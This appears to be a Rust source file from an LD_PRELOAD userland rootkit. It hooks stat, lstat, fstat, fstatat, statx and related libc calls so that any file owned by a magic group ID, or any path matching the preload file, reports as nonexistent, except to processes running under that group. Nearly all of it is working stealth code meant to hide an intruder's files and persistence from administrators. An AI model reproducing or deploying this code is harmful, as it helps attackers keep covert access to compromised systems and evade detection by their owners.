use std::ffi::{c_void, c_char, c_int, c_uint, CStr};
use libc::{getegid, stat as stat_s, statx as statx_s, stat64 as stat64_s};
use errno::{Errno, set_errno};

extern crate config;
use config::{GID, PRELOAD};

// so this doesn't actually exist in the libc crate, its just another reference to lstat(), but
// we can use it for internal usage within our program
#[no_mangle]
pub extern "C" fn __lxstat(version: c_int, path: *const c_char, buf: *mut stat_s) -> c_int {
    #[cfg(feature = "debug")]
    println!("__lxtstat() called");


    let o_lxstat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"__lxstat\0".as_ptr() as *const _) };
    let o_lxstat: extern "C" fn(c_int, *const c_char, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_lxstat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_lxstat(version, path, buf);
    }

    let result: c_int = o_lxstat(version, path, buf);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        #[cfg(feature = "debug")]
        println!("__lxstat() gid matches or path is ld.so.preload: gid {}", unsafe { (*buf).st_gid });

        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}

#[no_mangle]
pub extern "C" fn __lxstat64(version: c_int, path: *const c_char, buf: *mut stat64_s) -> c_int {
    let o_lxstat64: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"__lxstat64\0".as_ptr() as *const _) };
    let o_lxstat64: extern "C" fn(c_int, *const c_char, *mut stat64_s) -> c_int = unsafe { std::mem::transmute(o_lxstat64) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_lxstat64(version, path, buf);
    }

    let result: c_int = o_lxstat64(version, path, buf);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}

#[no_mangle]
pub extern "C" fn lstat(path: *const c_char, buf: *mut stat_s) -> c_int {
    let o_lstat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"lstat\0".as_ptr() as *const _) };
    let o_lstat: extern "C" fn(*const c_char, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_lstat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_lstat(path, buf);
    }

    let result: c_int = o_lstat(path, buf);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}


// hook fstat() to hide files that match gid 1337
#[no_mangle]
pub extern "C" fn fstat(fd: c_int, buf: *mut stat_s) -> c_int {
    let o_fstat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"fstat\0".as_ptr() as *const _) };
    let o_fstat: extern "C" fn(c_int, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_fstat) };

    #[cfg(feature = "debug")]
    println!("fstat() called: {} {}", gid, GID);

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_fstat(fd, buf);
    }

    let result: c_int = o_fstat(fd, buf);

    if unsafe { (*buf).st_gid } == GID {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}

#[no_mangle]
pub extern "C" fn fstatat(fd: c_int, path: *const c_char, buf: *mut stat_s, flags: c_int) -> c_int {
    let o_fstatat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"fstatat\0".as_ptr() as *const _) };
    let o_fstatat: extern "C" fn(c_int, *const c_char, *mut stat_s, c_int) -> c_int = unsafe { std::mem::transmute(o_fstatat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_fstatat(fd, path, buf, flags)
    }

    let result: c_int = o_fstatat(fd, path, buf, flags);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}

#[no_mangle]
pub extern "C" fn newfstatat(fd: c_int, path: *const c_char, buf: *mut stat_s, flags: c_int) -> c_int {
    let o_newfstatat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"newfstatat\0".as_ptr() as *const _) };
    let o_newfstatat: extern "C" fn(c_int, *const c_char, *mut stat_s, c_int) -> c_int = unsafe { std::mem::transmute(o_newfstatat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_newfstatat(fd, path, buf, flags)
    }

    let result: c_int = o_newfstatat(fd, path, buf, flags);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}

#[no_mangle]
pub extern "C" fn stat(path: *const c_char, buf: *mut stat_s) -> c_int {
    let o_stat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"stat\0".as_ptr() as *const _) };
    let o_stat: extern "C" fn(*const c_char, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_stat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_stat(path, buf);
    }

    let result: c_int = o_stat(path, buf);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1
    }

    return result
}

#[no_mangle]
pub extern "C" fn xstat(path: *const c_char, buf: *mut stat_s) -> c_int {
    let o_xstat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"xstat\0".as_ptr() as *const _) };
    let o_xstat: extern "C" fn(*const c_char, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_xstat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_xstat(path, buf);
    }

    let result: c_int = o_xstat(path, buf);

    if unsafe { (*buf).st_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1
    }

    return result
}

#[no_mangle]
pub extern "C" fn statx(fd: c_int, path: *const c_char, flags: c_int, mask: c_uint, statxbuf: *mut statx_s) -> c_int {
    #[cfg(feature = "debug")]
    println!("statx() called");

    let o_statx: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"statx\0".as_ptr() as *const _) };
    let o_statx: extern "C" fn(c_int, *const c_char, c_int, c_uint, *mut statx_s) -> c_int = unsafe { std::mem::transmute(o_statx) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_statx(fd, path, flags, mask, statxbuf);
    }

    let result: c_int = o_statx(fd, path, flags, mask, statxbuf);

    if unsafe { (*statxbuf).stx_gid } == GID || unsafe { CStr::from_ptr(path) }.to_str().unwrap().contains(PRELOAD) {
        set_errno(Errno(libc::ENOENT));
        return -1
    }

    return result;
}

#[no_mangle]
pub extern "C" fn __fxstat(fd: c_int, buf: *mut stat_s) -> c_int {
    let o_fxstat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"__fxstat\0".as_ptr() as *const _) };
    let o_fxstat: extern "C" fn(c_int, *mut stat_s) -> c_int = unsafe { std::mem::transmute(o_fxstat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_fxstat(fd, buf);
    }

    let result: c_int = o_fxstat(fd, buf);

    if unsafe { (*buf).st_gid } == GID {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return result;
}
